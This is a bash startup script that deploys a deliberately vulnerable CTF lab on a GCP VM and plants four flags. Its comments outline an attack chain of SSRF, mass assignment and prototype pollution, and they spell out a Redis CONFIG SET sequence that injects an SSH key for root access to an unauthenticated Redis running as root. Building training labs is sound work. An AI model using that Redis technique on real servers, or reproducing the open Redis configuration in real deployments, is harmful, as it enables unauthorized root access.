#!/bin/bash
# CipherOps Internal Portal Lab – GCP VM Startup Script
# Intentionally Vulnerable CTF Environment  [INSANE Difficulty]
# Attack Chain: SSRF → Mass Assignment → Prototype Pollution/RCE → Redis Root
#
# Deployment:
#
#   1. Set REPO_URL below to your GitHub repository URL.
#
#   2. Deploy the VM:
#
#      gcloud compute instances create cipherops-lab \
#        --zone=us-central1-a \
#        --machine-type=e2-medium \
#        --image-family=ubuntu-2204-lts \
#        --image-project=ubuntu-os-cloud \
#        --boot-disk-size=20GB \
#        --tags=cipherops-lab \
#        --metadata-from-file startup-script=startup-script.sh
#
#   3. Create firewall rules (HTTP for the portal, TCP 2222 for Redis SSH privesc):
#
#      gcloud compute firewall-rules create allow-cipherops \
#        --allow=tcp:80,tcp:2222 \
#        --target-tags=cipherops-lab \
#        --description="CipherOps lab: HTTP portal + Redis SSH key injection"
#
#   4. Browse to http://<EXTERNAL_IP>/ once setup completes (~5 min).
#
# Note: GCP enforces key-based SSH via OS Login / instance metadata by default.
# Password authentication is disabled at the platform level – no sshd_config
# changes are needed on the host VM.
set -e

# --- 1. System Dependencies ---
export DEBIAN_FRONTEND=noninteractive
apt-get update
apt-get install -y ca-certificates curl gnupg lsb-release git net-tools jq

# Install Docker CE
install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg \
    | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
chmod a+r /etc/apt/keyrings/docker.gpg

echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
https://download.docker.com/linux/ubuntu \
$(. /etc/os-release && echo "$VERSION_CODENAME") stable" \
    > /etc/apt/sources.list.d/docker.list

apt-get update
apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
systemctl enable --now docker

# --- 2. Repository Setup ---
# LAB CONFIG: Set this to your GitHub repo URL before deploying
REPO_URL="https://github.com/vulnerable-labs/cipherOps-internal-portal-lab.git"
REPO_DIR="/opt/cipherops-lab"

rm -rf "$REPO_DIR"
git clone "$REPO_URL" "$REPO_DIR"
cd "$REPO_DIR"

# --- 3. Build and Launch Services ---
docker compose pull --quiet || true
docker compose up -d --build

echo "[*] Waiting 40s for services to become healthy..."
sleep 40
docker compose ps

# --- 4. Deploy CTF Flags ---
# LAB CONFIG: Flags are injected at runtime so they are not visible in the
# repository source code. Each flag is only reachable via its intended technique.

# Flag 1 – embedded in backend/server.js on the internal debug server (127.0.0.1:6666)
#           Reachable only via SSRF with decimal-IP bypass: http://2130706433:6666/

# Flag 2 – returned by PUT /api/v1/internal/debug when is_admin is set to true
#           Reachable only via Mass Assignment through the SSRF chain

# Flag 3 – /var/www/flag2.txt inside cipherops-backend
# LAB CONFIG: Only readable after achieving RCE via prototype pollution (Step 3)
docker exec cipherops-backend sh -c \
    'echo "VulnOs{pr0t0_p0llut10n_2_rc3_ch41n}" > /var/www/flag2.txt && chmod 644 /var/www/flag2.txt'

# Flag 4 – /root/root.txt inside cipherops-redis
# LAB CONFIG: Redis runs as root with no authentication (protected-mode no, bind 0.0.0.0).
# OpenSSH runs inside the container on port 22 (mapped to host port 2222).
# Technique:
#   redis-cli -h <HOST_IP> CONFIG SET dir /root/.ssh
#   redis-cli -h <HOST_IP> CONFIG SET dbfilename authorized_keys
#   redis-cli -h <HOST_IP> SET crackit $'\n\n<attacker-pubkey>\n\n'
#   redis-cli -h <HOST_IP> SAVE
#   ssh -i <privkey> -p 2222 root@<HOST_IP>  →  cat /root/root.txt
docker exec cipherops-redis sh -c \
    'mkdir -p /root/.ssh && \
     echo "VulnOs{r3d1s_rw_2_ssh_k3y_r00t_pwn3d}" > /root/root.txt && \
     chmod 600 /root/root.txt'

# --- 5. MOTD ---
EXTERNAL_IP=$(curl -sf -H 'Metadata-Flavor: Google' \
    http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip \
    2>/dev/null || hostname -I | awk '{print $1}')

cat > /etc/motd << MOTD

╔══════════════════════════════════════════════════════════════════╗
║        CipherOps Internal Portal  —  CTF Lab  [INSANE]          ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  Target  →  http://${EXTERNAL_IP}/                               ║
║  Flags   →  VulnOs{...}  (4 total)                               ║
║                                                                  ║
║  Attack Chain                                                    ║
║  ─────────────────────────────────────────────────────────────── ║
║  1. SSRF           IP blacklist bypass → debug server :6666      ║
║  2. Mass Assign    PUT /internal/debug → is_admin: true          ║
║  3. Proto Pollution mergeDeep(__proto__) → RCE via cron          ║
║  4. Redis Root     CONFIG SET → SSH key injection → root.txt     ║
║                                                                  ║
║  Services (Docker internal)                                      ║
║  ─────────────────────────────────────────────────────────────── ║
║  nginx     :80    public reverse proxy                           ║
║  frontend  :3000  Next.js portal                                 ║
║  backend   :8080  Express API  (+:6666 loopback debug)           ║
║  redis     :6379  NO AUTH · runs as root                         ║
║  redis     :2222  SSH (reachable after key injection)            ║
║  postgres  :5432  fake consultant data (distraction)             ║
║                                                                  ║
║  GCP SSH: key-based only via OS Login (no passwords)             ║
╚══════════════════════════════════════════════════════════════════╝

MOTD

echo "[*] CipherOps Internal Portal lab setup complete."
echo "[*] Lab URL: http://${EXTERNAL_IP}/"
